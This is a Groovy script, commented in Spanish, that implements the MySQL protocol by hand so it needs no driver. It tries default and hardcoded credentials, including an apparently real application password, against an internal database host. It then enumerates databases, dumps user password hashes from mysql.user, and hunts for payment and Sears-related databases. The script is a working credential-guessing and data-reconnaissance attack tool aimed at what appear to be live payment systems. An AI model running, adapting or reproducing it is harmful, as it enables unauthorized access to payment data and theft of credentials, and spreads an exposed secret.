// Pure Groovy MySQL client (no JDBC driver needed)
// Implementación manual del protocolo MySQL 4.1+

import java.security.MessageDigest
import javax.net.ssl.*

println "=== PURE GROOVY MYSQL CLIENT ==="

def mysqlConn = null

class MySQLClient {
    Socket socket
    InputStream inp
    OutputStream out
    String serverVersion
    int seqNum = 0
    
    byte[] readPacket() {
        def header = new byte[4]
        inp.read(header)
        def plen = (header[0] & 0xFF) | ((header[1] & 0xFF) << 8) | ((header[2] & 0xFF) << 16)
        seqNum = header[3] & 0xFF
        def data = new byte[plen]
        int read = 0
        while (read < plen) {
            int n = inp.read(data, read, plen - read)
            if (n < 0) throw new Exception("Connection closed")
            read += n
        }
        return data
    }
    
    void sendPacket(byte[] data, int seq) {
        def header = new byte[4]
        header[0] = (byte)(data.length & 0xFF)
        header[1] = (byte)((data.length >> 8) & 0xFF)
        header[2] = (byte)((data.length >> 16) & 0xFF)
        header[3] = (byte)(seq & 0xFF)
        out.write(header)
        out.write(data)
        out.flush()
    }
    
    byte[] hashPassword(String password, byte[] authData) {
        if (!password) return new byte[0]
        def md = MessageDigest.getInstance("SHA-1")
        def hash1 = md.digest(password.bytes)
        md.reset()
        def hash2 = md.digest(hash1)
        md.reset()
        def hash12 = md.digest(authData + hash2)
        def result = new byte[hash1.length]
        hash1.eachWithIndex { b, i -> result[i] = (byte)(b ^ hash12[i]) }
        return result
    }
    
    boolean connect(String host, int port, String user, String password, String db) {
        socket = new Socket(host, port)
        socket.soTimeout = 15000
        inp = socket.inputStream
        out = socket.outputStream
        
        // Read handshake
        def greeting = readPacket()
        if ((greeting[0] & 0xFF) == 0xFF) {
            println "Error packet in handshake"
            return false
        }
        
        def proto = greeting[0] & 0xFF
        int nullPos = 0
        for (int i = 1; i < greeting.length; i++) {
            if (greeting[i] == 0) { nullPos = i; break }
        }
        serverVersion = new String(greeting, 1, nullPos - 1, "latin1")
        
        // Auth data
        def auth1 = Arrays.copyOfRange(greeting, nullPos + 5, nullPos + 13)
        
        // Find second null after nullPos+13
        int offset = nullPos + 13
        // skip: thread_id(4), auth_data_part1(8) already done
        // capabilities(2) + charset(1) + status(2) + cap_upper(2) + auth_data_len(1) + reserved(10)
        int capOffset = nullPos + 1 // thread_id was after null
        // Actually: greeting[1:null_pos] = version, then 4 bytes thread_id, then 8 bytes auth1, then filler(1), then caps(2), charset(1), status(2), cap_upper(2), auth_len(1), reserved(10)
        offset = nullPos + 1 + 4  // skip thread_id
        offset += 8  // auth1
        offset += 1  // filler
        offset += 2  // capabilities
        offset += 1  // charset
        offset += 2  // status
        offset += 2  // capabilities upper
        def authDataLen = greeting[offset] & 0xFF
        offset += 1  // auth_data_len
        offset += 10 // reserved
        
        def auth2Len = Math.max(13, authDataLen - 8)
        def auth2Bytes = Arrays.copyOfRange(greeting, offset, Math.min(offset + auth2Len, greeting.length))
        // Strip trailing null
        int auth2End = auth2Bytes.length
        while (auth2End > 0 && auth2Bytes[auth2End-1] == 0) auth2End--
        def auth2 = Arrays.copyOfRange(auth2Bytes, 0, auth2End)
        
        def authData = auth1 + auth2
        def pwdHash = hashPassword(password, authData)
        
        // Build response
        def clientFlags = 0x000FA685I
        def maxPacket = 0x01000000I
        
        def resp = new ByteArrayOutputStream()
        // client_flags (4) + max_packet_size (4) + charset (1) + reserved (23)
        resp.write([clientFlags & 0xFF, (clientFlags >> 8) & 0xFF, (clientFlags >> 16) & 0xFF, (clientFlags >> 24) & 0xFF] as byte[])
        resp.write([maxPacket & 0xFF, (maxPacket >> 8) & 0xFF, (maxPacket >> 16) & 0xFF, (maxPacket >> 24) & 0xFF] as byte[])
        resp.write(8 as byte)  // charset latin1
        resp.write(new byte[23])  // reserved
        resp.write(user.bytes)
        resp.write(0 as byte)
        resp.write(pwdHash.length as byte)
        resp.write(pwdHash)
        if (db) {
            resp.write(db.bytes)
            resp.write(0 as byte)
        } else {
            resp.write(0 as byte)
        }
        
        sendPacket(resp.toByteArray(), 1)
        
        def authResp = readPacket()
        if ((authResp[0] & 0xFF) == 0xFF) {
            def errCode = ((authResp[2] & 0xFF) << 8) | (authResp[1] & 0xFF)
            def errMsg = new String(authResp, 9, authResp.length - 9, "latin1")
            println "AUTH ERROR ${errCode}: ${errMsg}"
            return false
        }
        
        println "CONNECTED! MySQL ${serverVersion}"
        return true
    }
    
    List<List<String>> query(String sql) {
        def resp = new ByteArrayOutputStream()
        resp.write(3 as byte)  // COM_QUERY
        resp.write(sql.bytes)
        sendPacket(resp.toByteArray(), 0)
        
        def rows = []
        def state = "count"
        def colCount = 0
        
        while (true) {
            def pkt = readPacket()
            def firstByte = pkt[0] & 0xFF
            
            if (firstByte == 0xFF) {
                def errCode = ((pkt[2] & 0xFF) << 8) | (pkt[1] & 0xFF)
                def errMsg = new String(pkt, 9, pkt.length - 9, "latin1")
                return [["ERROR ${errCode}: ${errMsg}"]]
            }
            
            if (firstByte == 0xFE && pkt.length < 9) {
                if (state == "cols") { state = "rows"; continue }
                if (state == "rows") break
                continue
            }
            
            if (firstByte == 0x00 && state == "count") {
                return [["OK"]]
            }
            
            if (state == "count") {
                colCount = firstByte
                state = "cols"
                continue
            }
            
            if (state == "cols") continue
            
            if (state == "rows") {
                def row = []
                def pos = 0
                while (pos < pkt.length) {
                    def b = pkt[pos] & 0xFF
                    if (b == 0xFB) {
                        row << "NULL"
                        pos++
                    } else if (b < 251) {
                        row << new String(pkt, pos + 1, b, "utf-8")
                        pos += 1 + b
                    } else if (b == 0xFC) {
                        def flen = ((pkt[pos+2] & 0xFF) << 8) | (pkt[pos+1] & 0xFF)
                        row << new String(pkt, pos + 3, flen, "utf-8")
                        pos += 3 + flen
                    } else break
                }
                if (row) rows << row
            }
        }
        
        return rows
    }
    
    void close() {
        try { socket?.close() } catch(e) {}
    }
}

// Test connections
def tests = [
    ["172.27.141.4", 3306, "root", "", ""],
    ["172.27.141.4", 3306, "app_t1", 'wUt22Us2CUh#+M=', "payment_t1"],
    ["172.27.141.4", 3306, "root", "root", ""],
]

def client = null
tests.each { t ->
    if (client != null) return
    def c = new MySQLClient()
    println "\nTrying ${t[2]}@${t[0]}:${t[1]}"
    try {
        if (c.connect(t[0], t[1] as int, t[2], t[3], t[4])) {
            client = c
        } else {
            c.close()
        }
    } catch(e) {
        println "Exception: ${e.message}"
        c.close()
    }
}

if (client != null) {
    println "\n=== CONNECTED! RUNNING QUERIES ==="
    
    println "\n--- SHOW DATABASES ---"
    client.query("SHOW DATABASES").each { row -> println "  " + row.join(" | ") }
    
    println "\n--- payment_t1 TABLES ---"
    client.query("SHOW TABLES IN payment_t1").each { row -> println "  " + row.join(" | ") }
    
    println "\n--- TOP TABLES BY ROWS ---"
    client.query("""SELECT table_schema, table_name, table_rows 
        FROM information_schema.tables 
        WHERE table_schema NOT IN ('information_schema','mysql','performance_schema') 
        ORDER BY table_rows DESC LIMIT 25""").each { row -> println "  " + row.join(" | ") }
    
    println "\n--- MYSQL USERS ---"
    client.query("SELECT user, host, password FROM mysql.user").each { row -> println "  " + row.join(" | ") }
    
    println "\n--- SERVER VARS ---"
    client.query("SELECT @@hostname, @@version, @@datadir, @@port").each { row -> println "  " + row.join(" | ") }
    
    println "\n--- SEARS RELATED DBs ---"
    def dbs = client.query("SHOW DATABASES")
    dbs.findAll { r -> r[0].toLowerCase().contains("sears") || r[0].toLowerCase().contains("tienda") || r[0].toLowerCase().contains("t1pagos") || r[0].toLowerCase().contains("mrc") || r[0].toLowerCase().contains("payment") }.each { row ->
        println "  MATCH: " + row.join(" | ")
    }
    
    client.close()
} else {
    println "FAILED TO CONNECT"
}

println "\n=== FIN ==="
